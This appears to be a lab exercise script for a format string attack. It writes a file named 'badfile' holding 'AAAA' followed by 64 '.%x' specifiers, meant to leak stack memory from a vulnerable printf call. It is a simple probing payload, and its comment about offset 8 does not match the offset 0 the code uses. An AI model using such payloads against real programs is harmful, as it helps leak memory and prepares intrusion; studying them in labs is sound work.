#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to construct a string s
s = "AAAA"+".%x"*64+"\n" 

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[0:len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)